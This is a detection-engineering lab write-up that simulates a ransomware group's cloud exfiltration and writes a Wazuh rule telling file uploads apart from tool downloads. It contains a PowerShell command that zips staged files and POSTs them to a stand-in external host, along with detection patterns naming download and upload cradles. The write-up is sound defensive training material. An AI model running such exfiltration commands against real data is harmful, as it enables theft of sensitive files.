# Lab 03 - Exfiltration Detection (cloud upload)

## Objective
Detect INC Ransom's data-theft step - staging files and pushing them to a cloud
account (T1537) - and, as the IR angle, answer *what left, when, and over which
channel.* The headline finding is not a missing rule but a **misclassified** one: the
exfil upload fires an existing rule that labels it the opposite direction (an inbound
tool download). This lab builds the rule that tells exfiltration apart from ingress.

**Attack is a benign stand-in.** The "stolen data" is junk text; the upload targets an
unresolvable domain (`mega-sync-backup.example`) and never connects, so **nothing
leaves the lab.** The detection keys on the *attempt* (process + command line), never
on a successful transfer - which is what makes it fire before any data is actually lost.

## Framing
| Field | Value |
|---|---|
| Discipline | Detection engineering + IR scoping |
| INC link (Lab 05 rank) | Cloud exfiltration, #2: T1537 |
| ATT&CK | T1048 (Exfiltration Over Alternative Protocol), T1537 (Transfer Data to Cloud Account); staging precursor T1560 |
| Data source | Windows PowerShell **4104** (ScriptBlock) primary; Sysmon EID1/EID11/EID22, Security 4688 corroborating |
| Endpoint | Windows Sysmon endpoint, agent 002 |
| Rule produced | **100901** (level 13), chained off existing **100405** |
| Namespace | 100900+ |

## The attack (run on agent 002, no elevation needed)
```powershell
# 1. Stage dummy "sensitive" data (collection)
New-Item -ItemType Directory -Force C:\Loot | Out-Null
1..5 | ForEach-Object { ("fake-record-$_-" + ('X'*300)) | Out-File "C:\Loot\customer_$_.txt" }
# 2. Archive it (staging, T1560) - child process so Sysmon EID1 captures it
powershell -Command "Compress-Archive -Path C:\Loot\*.txt -DestinationPath C:\Loot\loot.zip -Force"
# 3. Exfiltrate to a cloud stand-in (T1537) - fails to connect, telemetry still generated
powershell -Command "try { Invoke-WebRequest -Uri 'https://mega-sync-backup.example/upload' -Method POST -InFile 'C:\Loot\loot.zip' -TimeoutSec 8 } catch { 'exfil attempt generated' }"
```
Each key action was launched as a **child `powershell.exe`** so a new-process event
records the full command line (a cmdlet typed inside an existing shell is not a new
process and would be captured only by 4104 ScriptBlock logging).

## Telemetry produced (read from the manager)
| Event ID | Source | What it captured |
|---|---|---|
| 4104 | Windows PowerShell (ScriptBlock) | the exact `Invoke-WebRequest ... -InFile ... -Method POST` text - **the decisive signal** |
| 1 | Sysmon (process create) | `powershell.exe` running Compress-Archive, then the upload |
| 11 | Sysmon (file create) | `loot.zip` written |
| 22 | Sysmon (DNS query) | lookup of `mega-sync-backup.example` |
| 4688 | Windows Security (process create) | same PowerShell launches |

## Detection engineering

### The finding - exfil is MISCLASSIFIED as ingress
The upload fired an existing rule immediately: **100405 (level 12)**, a Module 04 rule:
```xml
<rule id="100405" level="12">
  <if_group>powershell</if_group>
  <field name="win.system.eventID">^4104$</field>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(Net\.WebClient|DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|Invoke-RestMethod|Start-BitsTransfer|\b(iwr|irm|wget|curl)\b)</field>
  <description>PowerShell remote download cradle executed ... [T1105/T1059.001]</description>
</rule>
```
It is tagged **T1105 (Ingress Tool Transfer)** - data coming *in*. Our event is data
going *out*. The cause: `Invoke-WebRequest` / `Invoke-RestMethod` are **bidirectional**
(download with `-OutFile`, upload with `-InFile -Method POST`); 100405 keys only on the
**cmdlet name**, so it cannot tell theft from tooling and mislabels an exfiltration as a
malware download. For triage this is the difference between "a tool was pulled in" and
"data is leaving now" - a rule firing with the wrong direction is nearly as costly as
no rule.

Two further gaps, documented not closed:
- **Staging (Compress-Archive, T1560) is unrecognized** - fired only generic 67027
  (4688) and 92027 (Sysmon EID1 "powershell spawned powershell"). No collection-aware
  rule exists.
- **The DNS lookup (EID22) reached no alerting rule** - the shipped ruleset has zero
  DNS rules and `logall_json` is off, so the signal is invisible (same blind spot as
  Module 05 Lab 05).

### Rule 100901 - separate exfil from ingress
```xml
<rule id="100901" level="13">
  <if_sid>100405</if_sid>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(-InFile\b|\.UploadFile\(|\.UploadData\(|\.UploadString\(|-Method\s+['"]?(POST|PUT)\b)</field>
  <description>PowerShell web cmdlet used to UPLOAD a file - data exfiltration over web channel, not ingress [T1048/T1537]</description>
  <mitre><id>T1048</id><id>T1537</id></mitre>
</rule>
```
Design notes:
- **Chains off 100405** (`if_sid`): 100405 already confirms a web cmdlet was used;
  100901 refines only that subset and asks "is it an **upload**?" - efficient and
  precise, no re-scanning.
- **Upload semantics only:** `-InFile` (a file is being *sent*), WebClient `.Upload*`
  methods, or an explicit `POST`/`PUT` verb. Download-only cradles (`-OutFile`,
  `DownloadString`) do not match, so ingress stays with 100405.
- **Level 13 > 12:** exfiltration outranks a generic download cradle; and because a
  matching **child** rule supersedes its parent in Wazuh, an upload now alerts as
  100901 (exfil) instead of 100405 (ingress).

## Test matrix (live fire on agent 002, 2026-10-01)
| # | Action | Rule that alerted | Verdict |
|---|---|---|---|
| 1 | Upload, before 100901 | **100405 L12** (T1105 ingress) | misclassified - exfil seen as a download cradle |
| 2 | Upload, after 100901 | **100901 L13** (T1048/T1537 exfil) | child supersedes parent; correctly classified |
| - | Compress-Archive staging | 67027 L3 / 92027 L4 only | T1560 unrecognized (documented gap) |
| - | DNS lookup of cloud domain (EID22) | none | zero DNS rules + logall_json off (documented gap) |

Confirmed 100901 alert (evidence record):
```
Alert:        100901  level 13  "...used to UPLOAD a file - data exfiltration over web channel, not ingress"
Fired at:     2026-10-01T15:37:32 UTC (collector clock; NTP off, ~4h skew from agent wall time)
Host / agent: windows / 002
eventID:      4104 (PowerShell ScriptBlock)   MITRE: T1048, T1537 (tactic: Exfiltration)
scriptBlock:  try { Invoke-WebRequest -Uri 'https://mega-sync-backup.example/upload' -Method POST -InFile 'C:\Loot\loot.zip' ... }
```

## IR scoping angle - what left, when, over which channel
- **What:** `loot.zip` (the EID11 file-create + the `-InFile` argument name the object).
- **When:** the 4104/EID1 collector timestamp (mind the ~4h agent-vs-collector skew;
  NTP is off in this lab).
- **Channel:** web (HTTP POST) to an external-looking host. In a closed lab the target
  is unresolvable, so this is the *attempted* channel; the honest writeup says the
  destination is a stand-in and the detection is destination-agnostic by design.
- **Containment (simulated, per Lab 01):** isolate the host NIC; the production action
  is a proxy/egress block on the destination and credential reset for the account.

## Gotchas / notes
- **Bidirectional cmdlets defeat name-only rules.** Direction lives in the arguments
  (`-InFile`/`-Method POST` = out; `-OutFile` = in), not the cmdlet. Any download rule
  that keys on `Invoke-WebRequest` alone will mislabel exfil - check yours.
- **`curl.exe` is absent from the Sysmon include-list** (Module 05 Lab 05), so a
  curl-based upload would be invisible; PowerShell was used to guarantee telemetry.
- **The attempt is enough.** The upload never connected, yet 4104/EID1 captured the
  full intent - exfil detection should not depend on a completed transfer.

## Result
- Existing 100405 **fires but misclassifies** INC's web exfil as ingress tool transfer
  - a direction error, the exfil equivalent of Lab 02's representation-evasion.
- **100901 (level 13)** separates upload/exfil from download/ingress, live-verified
  superseding 100405 on the exact event.
- Staging (T1560) and the DNS channel (EID22) remain documented blind spots.
- Endpoint left clean (staging files are inert junk; removed in cleanup).

## Files
- Rule: `local_rules.xml` on the manager (100901, chained off 100405).
- Namespace 100900+ ; next: Lab 04 (RDP lateral movement in context, deploys 100412
  from Module 08), Lab 05 (paper-walkthrough capstone).
